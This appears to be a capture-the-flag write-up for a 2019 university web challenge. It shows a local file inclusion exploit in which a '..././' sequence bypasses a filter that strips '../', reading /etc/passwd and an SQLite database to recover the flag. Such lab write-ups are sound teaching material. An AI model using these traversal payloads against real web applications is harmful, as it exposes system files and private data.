# Egypt-Universities-CTF-2019

Hey all this is 0xN1ghtRa1d , this is our writeups for Egypt-Universities-CTF-2019 .

# Category

Web Security

# Points

200

# Description

LFI ( Local File Inclusion )
------------------------------

Page :  `http://3.121.98.79/E-CORP/?page=home.php`
trying to test simple payload `file:///etc/passwd`

Results : 
> Warning: include(./application/views/file:///etc/passwd): failed to open stream: No such file or directory in /var/www/html/E-CORP/index.php on line 84

>Warning: include(): Failed opening './application/views/file:///etc/passwd' for inclusion (include_path='.:/usr/share/php') in /var/www/html/E-CORP/index.php on line 84

you will get this error then we can use another method to get back into this dir /application/views/
`../../../../../../../../../../../etc/passwd` 

Results :
> Warning: include(./application/views/etc/passwd): failed to open stream: No such file or directory in /var/www/html/E-CORP/index.php on line 84

>Warning: include(): Failed opening './application/views/etc/passwd' for inclusion (include_path='.:/usr/share/php') in /var/www/html/E-CORP/index.php on line 84

It is clear that the application is removes `../`  from the `page` value
So, we will circumvent the site by adding this value `..././` instead of `../` 
payload : `..././..././..././..././..././..././..././..././etc/passwd` the application will remove `../` from `..././..././..././..././..././..././..././..././etc/passwd` So the last result will be `../../../../../../../etc/passwd`


Results :

>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash 
 
 
Done !!
We will do Directory Bruteforce attack to search for the file that contains the flag

>[16:09:34] 200 -    4KB - /E-CORP/index.php
[16:09:55] 200 -   11B  - /E-CORP/LICENSE
[16:13:22] 200 -  939B  - /E-CORP/README.md
[16:13:27] 200 -   54B  - /E-CORP/robots.txt

`robots.txt`/`README.md`/ is public ! 

`/robots.txt` : 
>User-agent: *
>Disallow: /README.md
>Disallow: /LICENSE

`/README.md` :

>
>$config = array();
>
>// Environment
>// $config['environment'] = 'production';
>$config['environment'] = 'development';
>
>// Security
>$config['secure'] = true;
>
>// Error reporting.
>if ($config['environment'] === 'production') {
>	ini_set('display_errors', 0);
>	error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
}
>
>
>// Database.
>$config['database-path'] = dirname(__FILE__) . `'/../database/E-Corp.db'`;
>$config['db'] = new SQLite3($config['database-path']);
>
>// Pages
>$config['pages'] = array('home.php', 'about.php', 'contact.php');
>$config['default-page'] = $config['pages'][0];


Certainly, `../database/E-Corp.db` contains the flag
`../database/E-Corp.db` >> `..././database/E-Corp.db`
we will include it  using  Payload `..././datbase/E-Corp.db` 

Results : 


>SQLite format 3@ .;� ����P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�5�QtableempempCREATE TABLE emp ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL UNIQUE, description TEXT NOT NULL, image TEXT NOT NULL, secret TINYINT NOT NULL )%9indexsqlite_autoindex_emp_1emp ~0V _�~�4�5�1 SecretDatabase encrypted & secured by Allsafe Cybersecurity Group flag{LFI_l00k5_s0_c00l}.https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/i/c440cf7a-e325-4f07-9bf5-e253ea414d7b/d9gp63e-d5e5a516-9878-4acc-9934-2434945d0e15.jpg/v1/fill/w_622,h_350,q_70,strp/allsafe_by_threebik_d9gp63e-350t.jpg�''=�Scott KnowlesChief Technology Officerhttps://vignette.wikia.nocookie.net/mrrobot/images/d/d2/Scott.png/revision/latest/scale-to-width-down/310?cb=20150829181743�t)�=�Tyrell WellickSenior Vice President of Technology (former), Hacker, Chief Technology Officer (current)https://vignette.wikia.nocookie.net/mrrobot/images/1/1a/Mr.-Robot-1x04-3.jpg/revision/latest/scale-to-width-down/310?cb=20150725100044�W#��Terry Colbycareer executive, formerly Chief Technology Officer (CTO) of E Corphttps://vignette.wikia.nocookie.net/mrrobot/images/5/54/Terry_Colby.png/revision/latest/scale-to-width-down/310?cb=20150602173801�M')�cPhillip PriceCEO of E Corp.https://vignette.wikia.nocookie.net/mrrobot/images/d/dd/Tumblr_e4e0d09f125afbdd165cd11b97acba0c_3553aa05_1280.jpg/revision/latest/scale-to-width-down/310?cb=20190928214408 ������ Secret'Scott Knowles)Tyrell Wellick#Terry Colby' Phillip Price ��emp 



# Flag

flag{LFI_l00k5_s0_c00l}
 
